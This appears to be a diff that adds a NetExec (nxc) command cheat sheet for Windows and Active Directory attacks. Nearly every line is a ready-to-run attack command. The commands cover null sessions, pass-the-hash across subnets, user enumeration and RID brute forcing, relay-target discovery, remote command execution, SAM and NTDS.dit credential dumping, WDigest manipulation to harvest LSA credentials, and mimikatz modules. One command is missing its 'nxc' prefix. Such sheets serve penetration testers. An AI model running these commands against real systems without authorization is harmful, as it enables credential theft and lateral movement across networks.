@@ -1,0 +1,90 @@
+% netexec
+
+# null session
+nxc smb <IP> -u "" -p ""
+
+# connect to target using local account
+nxc smb <IP> -u '<VICTIM>' -p '<PASS>' --local-auth
+
+# pass the hash against a subnet
+nxc smb 172.16.157.0/24 -u '<VICTIM>' -H 'LMHASH:NTHASH' --local-auth
+nxc smb 172.16.157.0/24 -u '<VICTIM>' -H 'NTHASH'
+
+# target format subnet list fqdn
+nxc smb ms.evilcorp.org
+nxc smb 192.168.1.0 192.168.0.2
+nxc smb 192.168.1.0-28 10.0.0.1-67
+nxc smb 192.168.1.0/24
+nxc smb targets.txt
+
+# enumerate users
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --users
+nxc smb <IP_OR_SUBNET> -d '<DOMAIN>' -u '<VICTIM>' -p '<PASS>' --users
+
+# perform rid bruteforce to get users
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --rid-brute
+
+# enumerate domain groups
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --groups
+
+# enumerate local users
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth
+
+# generate a list of relayable hosts (smb signing disabled)
+nxc smb 192.168.1.0/24 --gen-relay-list output.txt
+
+# enumerate available shares
+nxc smb 192.168.215.138 -u '<VICTIM>' -p '<PASS>' --local-auth --shares
+
+# get the active sessions
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --sessions
+
+# check logged in users
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --lusers
+
+# get the password policy
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --pass-pol
+
+# execute command through cmd.exe (admin privileges required)
+nxc smb 192.168.10.11 -u '<VICTIM>' -p 'P@ssw0rd' -x 'whoami'
+
+# force the smbexec method (default order: wmiexec, atexec, smbexec)
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' -x 'net user '<VICTIM>' /domain' --exec-method smbexec
+
+# execute commands through powershell (admin privileges required)
+nxc smb 192.168.10.11 -u '<VICTIM>' -p 'P@ssw0rd' -X 'whoami'
+
+# dump local SAM hashes
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth --sam
+
+# enable/disable WDigest to get credentials from the LSA memory; force the logoff and wait for logon
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth --wdigest enable
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth --wdigest disable
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' -x 'quser'
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' -x 'logoff <sessionid>'
+
+# dump the NTDS.dit from DC using methods from secretsdump.py
+nxc smb 192.168.1.100 -u '<VICTIM>' -p '<PASS>' --ntds
+
+# uses the volume shadow copy service
+nxc smb 192.168.1.100 -u '<VICTIM>' -p '<PASS>' --ntds vss
+
+# dump the NTDS.dit password history
+smb 192.168.1.0/24 -u '<VICTIM>' -p '<PASS>' --ntds-history
+
+# list available modules
+nxc smb -L
+
+# module information
+nxc smb -M mimikatz --module-info
+
+# view module options
+nxc smb -M mimikatz --options
+
+# mimikatz module
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth -M mimikatz
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' -M mimikatz
+nxc smb <IP_OR_SUBNET> -u '<VICTIM>' -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
+
+# ssh
+nxc ssh <SUBNET>.<START>-<END> --key-file <KEYFILE> -u ./users.txt [-p <KEYFILE_PASS>] [--kerberos]
